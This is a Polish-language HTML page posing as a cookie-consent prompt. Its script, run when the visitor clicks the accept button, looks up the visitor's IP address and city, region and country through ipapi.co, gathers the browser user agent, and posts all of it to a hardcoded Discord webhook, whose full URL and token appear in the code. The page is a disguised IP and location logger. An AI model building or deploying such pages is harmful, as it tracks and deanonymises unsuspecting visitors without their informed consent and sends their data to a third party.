<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cookies 🍪</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
      color: #fff;
      overflow: hidden;
    }

    .container {
      max-width: 700px;
      padding: 2rem;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid #333;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(255, 105, 180, 0.2);
      backdrop-filter: blur(10px);
      animation: fadeIn 1s ease-out;
    }

    h1 {
      font-size: 3rem;
      color: #ff69b4;
      margin-bottom: 1rem;
      animation: pulse 2s infinite;
    }

    p {
      font-size: 1.2rem;
      color: #ccc;
      margin-bottom: 2rem;
    }

    button {
      font-size: 1.5rem;
      padding: 0.8rem 2rem;
      background: #ff69b4;
      color: white;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: 0.3s ease;
      box-shadow: 0 4px 12px rgba(255, 105, 180, 0.3);
    }

    button:hover {
      transform: scale(1.05);
      background: #ff85c1;
    }

    #status {
      margin-top: 2rem;
      font-size: 1rem;
      color: #55ff55;
      background: #111;
      padding: 1rem;
      border-radius: 12px;
      display: inline-block;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>🍪 Akceptacja Ciasteczek</h1>
    <p>Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br>
    Klikając przycisk poniżej, zgadzasz się na ich użycie.</p>

    <button id="cookie-btn">Zatwierdzam 🍪</button>
    <div id="status"></div>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1385313513114833169/xvypbNqZhd6asz7f8GNTw93kAocwRI8FWkGGTev3rqrl2JQVQ5fUestuR3mQbQMypzhK";

    document.getElementById("cookie-btn").onclick = async () => {
      const status = document.getElementById("status");
      status.textContent = "Zbieranie danych... 🍪";

      const userAgent = navigator.userAgent;
      let ip = "Nieznane";
      let location = "Nieznana lokalizacja";

      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip || "Brak IP";
        location = `${data.city}, ${data.region}, ${data.country_name}`;
      } catch (e) {
        ip = "Błąd IP";
      }

      const embed = {
        embeds: [{
          title: "🍪 Nowe ciasteczko kliknięte!",
          color: 0xff69b4,
          fields: [
            { name: "IP", value: `\`${ip}\``, inline: false },
            { name: "Lokalizacja", value: location, inline: false },
            { name: "User Agent", value: userAgent.slice(0, 1024), inline: false }
          ],
          footer: { text: "Ciasteczkowy bot" },
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embed)
      });

      status.innerHTML = `<b>🍪 Zapisano ciasteczko!</b><br><small>IP: ${ip}<br>Lokalizacja: ${location}</small>`;
    }
  </script>

</body>
</html>
